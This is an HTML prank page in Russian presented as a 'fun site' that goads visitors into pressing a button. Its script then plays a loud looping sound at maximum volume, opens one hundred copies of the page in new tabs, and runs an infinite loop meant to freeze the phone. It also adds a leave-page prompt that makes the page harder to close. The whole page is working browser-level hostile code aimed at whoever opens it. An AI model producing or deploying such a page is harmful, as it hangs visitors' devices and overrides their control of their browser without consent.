<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Весёлый сайт</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-size: 5rem;
            font-family: Arial, sans-serif;
            text-transform: uppercase;
            text-align: center;
            flex-direction: column;
        }
        button {
            font-size: 2rem;
            padding: 20px;
            margin-top: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="text">Нажми, если не лох</div>
    <button onclick="startMadness()">НАЖМИ!</button>
    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" loop></audio>

    <script>
        let sound = document.getElementById("sound");

        function startMadness() {
            sound.volume = 1.0; // Громкость на максимум
            sound.play().catch(err => console.log("Ошибка автозапуска:", err));

            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 секунду
            setTimeout(freezePhone, 2000); // Запуск зависания через 2 секунды
        }

        function spamTabs() {
            for (let i = 0; i < 100; i++) {
                window.open(window.location.href, '_blank');
            }
        }

        function freezePhone() {
            while (true) {
                console.log("Телефон зависает...");
            }
        }

        window.onbeforeunload = function() {
            return "Ты точно хочешь уйти?";
        };
    </script>
</body>
</html>
